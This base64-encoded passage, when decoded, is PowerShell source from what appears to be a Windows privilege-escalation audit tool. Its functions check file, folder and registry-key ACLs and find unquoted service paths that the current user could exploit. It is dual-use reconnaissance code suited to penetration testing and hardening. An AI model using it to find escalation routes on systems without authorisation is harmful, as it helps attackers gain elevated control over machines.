uJ3QgZXhpc3QsIGNoZWNrIGlmIHRoZSBwYXJlbnQgZm9sZGVyIGFsbG93cyBmb3IgbW9kaWZpY2F0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFBhcmVudFBhdGggPSAoU3BsaXQtUGF0aCAtUGF0aCAkVGVtcFBhdGggLVBhcmVudCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuVHJpbSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUGFyZW50UGF0aCAtYW5kICgkUGFyZW50UGF0aCAtbmUgJycpIC1hbmQgKFRlc3QtUGF0aCAtUGF0aCAkUGFyZW50UGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDYW5kaWRhdGVQYXRocyArPSBSZXNvbHZlLVBhdGggLVBhdGggJFBhcmVudFBhdGggfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBQYXRoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyB0cmFwIGJlY2F1c2UgU3BsaXQtUGF0aCBkb2Vzbid0IGhhbmRsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSBuaWNlbHkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgdGhlIHNlcGFyYXRvciBjb250YWlucyBhIHNwYWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJENhbmRpZGF0ZVBhdGhzICs9IFJlc29sdmUtUGF0aCAtUGF0aCAkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpFeHBhbmRFbnZpcm9ubWVudFZhcmlhYmxlcygkXykpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgUGF0aCB8IEZvckVhY2gtT2JqZWN0IHskXy5UcmltKCl9IHwgV2hlcmUtT2JqZWN0IHsoJF8gLW5lICcnKSAtYW5kIChUZXN0LVBhdGggLVBhdGggJF8pfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiREVCVUc6IEdvdCBhIGRyaXZlIGxldHRlciBhcyBhIHBhdGg6ICRfIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkQ2FuZGlkYXRlUGF0aHMgfCBTb3J0LU9iamVjdCAtVW5pcXVlIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgICAgICRDYW5kaWRhdGVQYXRoID0gJF8KCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgR2V0LUFjbCAtUGF0aCAkQ2FuZGlkYXRlUGF0aCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IEFjY2VzcyB8IFdoZXJlLU9iamVjdCB7KCRfLkFjY2Vzc0NvbnRyb2xUeXBlIC1tYXRjaCAnQWxsb3cnKX0gfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgICAgICAgICAkRmlsZVN5c3RlbVJpZ2h0cyA9ICRfLkZpbGVTeXN0ZW1SaWdodHMudmFsdWVfXwoKICAgICAgICAgICAgICAgICAgICAgICAgJFBlcm1pc3Npb25zID0gJEFjY2Vzc01hc2suS2V5cyB8IFdoZXJlLU9iamVjdCB7ICRGaWxlU3lzdGVtUmlnaHRzIC1iYW5kICRfIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRhY2Nlc3NNYXNrWyRfXSB9CgogICAgICAgICAgICAgICAgICAgICAgICAjIHRoZSBzZXQgb2YgcGVybWlzc2lvbiB0eXBlcyB0aGF0IGFsbG93IGZvciBtb2RpZmljYXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgJENvbXBhcmlzb24gPSBDb21wYXJlLU9iamVjdCAtUmVmZXJlbmNlT2JqZWN0ICRQZXJtaXNzaW9ucyAtRGlmZmVyZW5jZU9iamVjdCBAKCdHZW5lcmljV3JpdGUnLCAnR2VuZXJpY0FsbCcsICdNYXhpbXVtQWxsb3dlZCcsICdXcml0ZU93bmVyJywgJ1dyaXRlREFDJywgJ1dyaXRlRGF0YS9BZGRGaWxlJywgJ0FwcGVuZERhdGEvQWRkU3ViZGlyZWN0b3J5JykgLUluY2x1ZGVFcXVhbCAtRXhjbHVkZURpZmZlcmVudAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJENvbXBhcmlzb24pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5JZGVudGl0eVJlZmVyZW5jZSAtbm90bWF0Y2ggJ15TLTEtNS4qJyAtYW5kICRfLklkZW50aXR5UmVmZXJlbmNlIC1ub3RtYXRjaCAnXlMtMS0xNS0uKicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigtbm90ICgkVHJhbnNsYXRlZElkZW50aXR5UmVmZXJlbmNlc1skXy5JZGVudGl0eVJlZmVyZW5jZV0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgdHJhbnNsYXRlIHRoZSBJZGVudGl0eVJlZmVyZW5jZSBpZiBpdCdzIGEgdXNlcm5hbWUgYW5kIG5vdCBhIFNJRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlVc2VyID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLk5UQWNjb3VudCgkXy5JZGVudGl0eVJlZmVyZW5jZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKDEgLWVxIDApIHsgV3JpdGUtVmVyYm9zZSAiU2hhbGwgd2UgcGxheSBhIGdhbWU/IiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUcmFuc2xhdGVkSWRlbnRpdHlSZWZlcmVuY2VzWyRfLklkZW50aXR5UmVmZXJlbmNlXSA9ICRJZGVudGl0eVVzZXIuVHJhbnNsYXRlKFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0pIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5U0lEID0gJFRyYW5zbGF0ZWRJZGVudGl0eVJlZmVyZW5jZXNbJF8uSWRlbnRpdHlSZWZlcmVuY2VdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlTSUQgPSAkXy5JZGVudGl0eVJlZmVyZW5jZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRDdXJyZW50VXNlclNpZHMgLWNvbnRhaW5zICRJZGVudGl0eVNJRCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSBAewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNb2RpZmlhYmxlUGF0aCA9ICRDYW5kaWRhdGVQYXRoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElkZW50aXR5UmVmZXJlbmNlID0gJF8uSWRlbnRpdHlSZWZlcmVuY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGVybWlzc2lvbnMgPSAkUGVybWlzc2lvbnMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAjIHRyYXAgYmVjYXVzZSBHZXQtQWNsIGRvZXNuJ3QgaGFuZGxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIG5pY2VseQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBHZXQtRXhwbG9pdGFibGVVbnF1b3RlZFBhdGggewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEhlbHBlciAtIFBhcnNlIGEgcGF0aCwgZGV0ZXJtaW5lIGlmIGl0J3MgInVucXVvdGVkIiBhbmQgY2hlY2sgd2hldGhlciBpdCdzIGV4cGxvaXRhYmxlLgoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgUGFyc2UgYSBwYXRoLCBkZXRlcm1pbmUgaWYgaXQncyAidW5xdW90ZWQiIGFuZCBjaGVjayB3aGV0aGVyIGl0J3MgZXhwbG9pdGFibGUuCiAgICAKICAgIC5QQVJBTUVURVIgUGF0aAoKICAgIEEgcGF0aCAob3IgYSBjb21tYW5kIGxpbmUgZm9yIGV4YW1wbGUpCiAgICAKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgW3N0cmluZ10gJFBhdGgKICAgICkKCiAgICAkUGVybWlzc2lvbnNBZGRGaWxlID0gQCgiV3JpdGVEYXRhL0FkZEZpbGUiLCAiRGVsZXRlQ2hpbGQiLCAiV3JpdGVEQUMiLCAiV3JpdGVPd25lciIpCiAgICAjICRQZXJtaXNzaW9uc0FkZEZvbGRlciA9IEAoIkFwcGVuZERhdGEvQWRkU3ViZGlyZWN0b3J5IiwgIkRlbGV0ZUNoaWxkIiwgIldyaXRlREFDIiwgIldyaXRlT3duZXIiKQoKICAgICMgSWYgdGhlIFBhdGggZG9lc24ndCBzdGFydCB3aXRoIGEgIiBvciBhICcgCiAgICBpZiAoLW5vdCAoJFBhdGguU3RhcnRzV2l0aCgiYCIiKSAtb3IgJFBhdGguU3RhcnRzV2l0aCgiJyIpKSkgewogICAgICAgICAgICAgICAgCiAgICAgICAgIyBFeHRyYWN0IHRoZSBiaW5wYXRoIGZyb20gdGhlIEltYWdlUGF0aAogICAgICAgICRCaW5QYXRoID0gJFBhdGguU3ViU3RyaW5nKDAsICRQYXRoLlRvTG93ZXIoKS5JbmRleE9mKCIuZXhlIikgKyA0KQoKICAgICAgICAjIFdyaXRlLVZlcmJvc2UgIlVucXVvdGVkIHBhdGggYmluYXJ5OiAkKCRCaW5QYXRoKSIKCiAgICAgICAgIyBJZiB0aGUgYmlucGF0aCBjb250YWlucyBzcGFjZXMKICAgICAgICBJZiAoJEJpblBhdGggLW1hdGNoICIuKiAuKiIpIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZvdW5kIGFuIHVucXVvdGVkIHBhdGggdGhhdCBjb250YWlucyBzcGFjZXM6ICQoJEJpblBhdGgpIgoKICAgICAgICAgICAgJFNwbGl0UGF0aEFycmF5ID0gJEJpblBhdGguU3BsaXQoJyAnKQogICAgICAgICAgICAkQ29uY2F0UGF0aEFycmF5ID0gQCgpCiAgICAgICAgICAgIGZvciAoJGk9MDsgJGkgLWx0ICRTcGxpdFBhdGhBcnJheS5Db3VudDsgJGkrKykgewogICAgICAgICAgICAgICAgJENvbmNhdFBhdGhBcnJheSArPSAkU3BsaXRQYXRoQXJyYXlbMC4uJGldIC1qb2luICcgJwogICAgICAgICAgICB9CgogICAgICAgICAgICAjIFdlIGV4Y2x1ZGUgdGhlIGJpbmFyeSBwYXRoIGl0c2VsZgogICAgICAgICAgICAkQ29uY2F0UGF0aEFycmF5IHwgV2hlcmUtT2JqZWN0IHsgLW5vdCAoJF8gLWxpa2UgJEJpblBhdGgpIH0gfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgJEJpbkZvbGRlciA9IFNwbGl0LVBhdGggLVBhdGggJF8gLVBhcmVudAoKICAgICAgICAgICAgICAgIHRyeSB7CgogICAgICAgICAgICAgICAgICAgICMgRG9lcyB0aGUgcGFyZW50IGZvbGRlciBleGlzdD8KICAgICAgICAgICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRCaW5Gb2xkZXIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICMgSWYgdGhlIHBhcmVudCBmb2xkZXIgZXhpc3RzLCBjYW4gd2UgYWRkIGZpbGVzPwogICAgICAgICAgICAgICAgICAgICAgICAkTW9kaWZpYWJsZVBhdGhzID0gJEJpbkZvbGRlciB8IEdldC1Nb2RpZmlhYmxlUGF0aCB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAkXy5Nb2RpZmlhYmxlUGF0aCAtYW5kICgkXy5Nb2RpZmlhYmxlUGF0aCAtbmUgJycpfQogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkTW9kaWZpYWJsZVBhdGggaW4gJE1vZGlmaWFibGVQYXRocykgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgVmVyaWZ5IHRoYXQgdGhlIHBlcm1pc3Npb25zIHRoYXQgd2VyZSByZXR1cm5lZCBieSBHZXQtTW9kaWZpYWJsZVBhdGggCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHJlYWxseSBhbGxvdyB1cyB0byBhZGQgZmlsZXMgKHRoaXMgc2hvdWxkIGF1dG9tYXRpY2FsbHkgZXhjbHVkZSBDOlwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGZvciBleGFtcGxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFBlcm1pc3Npb25zU2V0ID0gJFBlcm1pc3Npb25zQWRkRmlsZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJFBlcm1pc3Npb24gaW4gJE1vZGlmaWFibGVQYXRoLlBlcm1pc3Npb25zKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUGVybWlzc2lvbnNTZXQgLWNvbnRhaW5zICRQZXJtaXNzaW9uKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW9kaWZpYWJsZVBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAjIGJlY2F1c2UgU3BsaXQtUGF0aCBkb2Vzbid0IGhhbmRsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSBuaWNlbHkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gR2V0LU1vZGlmaWFibGVSZWdpc3RyeVBhdGggewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEhlbHBlciAtIENoZWNrcyB0aGUgcGVybWlzc2lvbnMgb2YgYSBnaXZlbiByZWdpc3RyeSBrZXkgYW5kIHJldHVybnMgdGhlIG9uZXMgdGhhdCB0aGUgY3VycmVudCAKICAgIHVzZXIgY2FuIG1vZGlmeS4gSXQncyBiYXNlZCBvbiB0aGUgc2FtZSB0ZWNobmlxdWUgYXMgdGhlIG9uZSB1c2VkIGJ5IEBoYXJtajB5IGluIAogICAgIkdldC1Nb2RpZmlhYmxlUGF0aCIuCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBBbnkgcmVnaXN0cnkgcGF0aCB0aGF0IHRoZSBjdXJyZW50IHVzZXIgaGFzIG1vZGlmaWNhdGlvbiByaWdodHMgb24gaXMgcmV0dXJuZWQgaW4gYSBjdXN0b20gCiAgICBvYmplY3QgdGhhdCBjb250YWlucyB0aGUgbW9kaWZpYWJsZSBwYXRoLCBhc3NvY2lhdGVkIHBlcm1pc3Npb24gc2V0LCBhbmQgdGhlIElkZW50aXR5UmVmZXJlbmNlCiAgICB3aXRoIHRoZSBzcGVjaWZpZWQgcmlnaHRzLiBUaGUgU0lEIG9mIHRoZSBjdXJyZW50IHVzZXIgYW5kIGFueSBncm91cCBoZS9zaGUgYXJlIGEgcGFydCBvZiBhcmUgCiAgICB1c2VkIGFzIHRoZSBjb21wYXJpc29uIHNldCBhZ2FpbnN0IHRoZSBwYXJzZWQgcGF0aCBEQUNMcy4KICAgIAogICAgLlBBUkFNRVRFUiBQYXRoCgogICAgQSByZWdpc3RyeSBrZXkgcGF0aC4gUmVxdWlyZWQKICAgIAogICAgLkVYQU1QTEUKCiAgICBHZXQtTW9kaWZpYWJsZVJlZ2lzdHJ5UGF0aCAtUGF0aCAiUmVnaXN0cnk6OkhLRVlfTE9DQUxfTUFDSElORVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcVnVsblNlcnZpY2UiCgogICAgTmFtZSAgICAgICAgICAgICAgOiBWdWxuU2VydmljZQogICAgSW1hZ2VQYXRoICAgICAgICAgOiBDOlxBUFBTXE15QXBwXHNlcnZpY2UuZXhlCiAgICBVc2VyICAgICAgICAgICAgICA6IE5UIEFVVEhPUklUWVxOZXR3b3JrU2VydmljZQogICAgTW9kaWZpYWJsZVBhdGggICAgOiB7TWljcm9zb2Z0LlBvd2VyU2hlbGwuQ29yZVxSZWdpc3RyeTo6SEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xWdWxuU2VydmljZX0KICAgIElkZW50aXR5UmVmZXJlbmNlIDogTlQgQVVUSE9SSVRZXElOVEVSQUNUSVZFCiAgICBQZXJtaXNzaW9ucyAgICAgICA6IHtSZWFkQ29udHJvbCwgQXBwZW5kRGF0YS9BZGRTdWJkaXJlY3RvcnksIFJlYWRFeHRlbmRlZEF0dHJpYnV0ZXMsIFJlYWREYXRhL0xpc3REaXJlY3Rvcnl9CiAgICBTdGF0dXMgICAgICAgICAgICA6IFJ1bm5pbmcKICAgIFVzZXJDYW5TdGFydCAgICAgIDogVHJ1ZQogICAgVXNlckNhblJlc3RhcnQgICAgOiBGYWxzZQogICAgCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFBhdGgKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgIyBmcm9tIGh0dHA6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjgwMjk4NzIvcmV0cmlldmluZy1zZWN1cml0eS1kZXNjcmlwdG9yLWFuZC1nZXR0aW5nLW51bWJlci1mb3ItZmlsZXN5c3RlbXJpZ2h0cwogICAgICAgICRBY2Nlc3NNYXNrID0gQHsKICAgICAgICAgICAgW3VpbnQzMl0nMHg4MDAwMDAwMCcgPSAnR2VuZXJpY1JlYWQnCiAgICAgICAgICAgIFt1aW50MzJdJzB4NDAwMDAwMDAnID0gJ0dlbmVyaWNXcml0ZScKICAgICAgICAgICAgW3VpbnQzMl0nMHgyMDAwMDAwMCcgPSAnR2VuZXJpY0V4ZWN1dGUnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MTAwMDAwMDAnID0gJ0dlbmVyaWNBbGwnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDIwMDAwMDAnID0gJ01heGltdW1BbGxvd2VkJwogICAgICAgICAgICBbdWludDMyXScweDAxMDAwMDAwJyA9ICdBY2Nlc3NTeXN0ZW1TZWN1cml0eScKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDEwMDAwMCcgPSAnU3luY2hyb25pemUnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwODAwMDAnID0gJ1dyaXRlT3duZXInCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwNDAwMDAnID0gJ1dyaXRlREFDJwogICAgICAgICAgICBbdWludDMyXScweDAwMDIwMDAwJyA9ICdSZWFkQ29udHJvbCcKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAxMDAwMCcgPSAnRGVsZXRlJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMTAwJyA9ICdXcml0ZUF0dHJpYnV0ZXMnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwODAnID0gJ1JlYWRBdHRyaWJ1dGVzJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDQwJyA9ICdEZWxldGVDaGlsZCcKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAyMCcgPSAnRXhlY3V0ZS9UcmF2ZXJzZScKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAxMCcgPSAnV3JpdGVFeHRlbmRlZEF0dHJpYnV0ZXMnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDgnID0gJ1JlYWRFeHRlbmRlZEF0dHJpYnV0ZXMnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDQnID0gJ0FwcGVuZERhdGEvQWRkU3ViZGlyZWN0b3J5JwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDAyJyA9ICdXcml0ZURhdGEvQWRkRmlsZScKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwMScgPSAnUmVhZERhdGEvTGlzdERpcmVjdG9yeScKICAgICAgICB9CgogICAgICAgICRVc2VySWRlbnRpdHkgPSBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkKICAgICAgICAkQ3VycmVudFVzZXJTaWRzID0gJFVzZXJJZGVudGl0eS5Hcm91cHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBWYWx1ZQogICAgICAgICRDdXJyZW50VXNlclNpZHMgKz0gJFVzZXJJZGVudGl0eS5Vc2VyLlZhbHVlCgogICAgICAgICRUcmFuc2xhdGVkSWRlbnRpdHlSZWZlcmVuY2VzID0gQHt9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgJEtleUFjbCA9IEdldC1BY2wgLVBhdGggJFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0QWNsRXJyb3IKICAgICAgICBpZiAoLW5vdCAkR2V0QWNsRXJyb3IpIHsKICAgICAgICAgICAgJEtleUFjbCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IEFjY2VzcyB8IFdoZXJlLU9iamVjdCB7KCRfLkFjY2Vzc0NvbnRyb2xUeXBlIC1tYXRjaCAnQWxsb3cnKX0gfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgJFJlZ2lzdHJ5UmlnaHRzID0gJF8uUmVnaXN0cnlSaWdodHMudmFsdWVfXwoKICAgICAgICAgICAgICAgICRQZXJtaXNzaW9ucyA9ICRBY2Nlc3NNYXNrLktleXMgfCBXaGVyZS1PYmplY3QgeyAkUmVnaXN0cnlSaWdodHMgLWJhbmQgJF8gfSB8IEZvckVhY2gtT2JqZWN0IHsgJGFjY2Vzc01hc2tbJF9dIH0KCiAgICAgICAgICAgICAgICAjIHRoZSBzZXQgb2YgcGVybWlzc2lvbiB0eXBlcyB0aGF0IGFsbG93IGZvciBtb2RpZmljYXRpb24KICAgICAgICAgICAgICAgICRDb21wYXJpc29uID0gQ29tcGFyZS1PYmplY3QgLVJlZmVyZW5jZU9iamVjdCAkUGVybWlzc2lvbnMgLURpZmZlcmVuY2VPYmplY3QgQCgnR2VuZXJpY1dyaXRlJywgJ0dlbmVyaWNBbGwnLCAnTWF4aW11bUFsbG93ZWQnLCAnV3JpdGVPd25lcicsICdXcml0ZURBQycsICdXcml0ZURhdGEvQWRkRmlsZScsICdBcHBlbmREYXRhL0FkZFN1YmRpcmVjdG9yeScpIC1JbmNsdWRlRXF1YWwgLUV4Y2x1ZGVEaWZmZXJlbnQKCiAgICAgICAgICAgICAgICBpZigkQ29tcGFyaXNvbikgewogICAgICAgICAgICAgICAgICAgIGlmICgkXy5JZGVudGl0eVJlZmVyZW5jZSAtbm90bWF0Y2ggJ15TLTEtNS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICBpZigtbm90ICgkVHJhbnNsYXRlZElkZW50aXR5UmVmZXJlbmNlc1skXy5JZGVudGl0eVJlZmVyZW5jZV0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHRyYW5zbGF0ZSB0aGUgSWRlbnRpdHlSZWZlcmVuY2UgaWYgaXQncyBhIHVzZXJuYW1lIGFuZCBub3QgYSBTSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVVzZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50KCRfLklkZW50aXR5UmVmZXJlbmNlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFRyYW5zbGF0ZWRJZGVudGl0eVJlZmVyZW5jZXNbJF8uSWRlbnRpdHlSZWZlcmVuY2VdID0gJElkZW50aXR5VXNlci5UcmFuc2xhdGUoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSkgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVNJRCA9ICRUcmFuc2xhdGVkSWRlbnRpdHlSZWZlcmVuY2VzWyRfLklkZW50aXR5UmVmZXJlbmNlXQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5U0lEID0gJF8uSWRlbnRpdHlSZWZlcmVuY2UKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmKCRDdXJyZW50VXNlclNpZHMgLWNvbnRhaW5zICRJZGVudGl0eVNJRCkgewogICAgICAgICAgICAgICAgICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1vZGlmaWFibGVQYXRoID0gJFBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIElkZW50aXR5UmVmZXJlbmNlID0gJF8uSWRlbnRpdHlSZWZlcmVuY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBlcm1pc3Npb25zID0gJFBlcm1pc3Npb25zCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9IAp9CgpmdW5jdGlvbiBBZGQtU2VydmljZURhY2wgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEhlbHBlciAtIEFkZHMgYSBEYWNsIGZpZWxkIHRvIGEgc2VydmljZSBvYmplY3QgcmV0dXJuZWQgYnkgR2V0LVNlcnZpY2UuCgogICAgQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIKICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQoKICAgIC5ERVNDUklQVElPTgoKICAgIFRha2VzIG9uZSBvciBtb3JlIFNlcnZpY2VQcm9jZXNzLlNlcnZpY2VDb250cm9sbGVyIG9iamVjdHMgb24gdGhlIHBpcGVsaW5lIGFuZCBhZGRzIGEKICAgIERhY2wgZmllbGQgdG8gZWFjaCBvYmplY3QuIEl0IGRvZXMgdGhpcyBieSBvcGVuaW5nIGEgaGFuZGxlIHdpdGggUmVhZENvbnRyb2wgZm9yIHRoZQogICAgc2VydmljZSB3aXR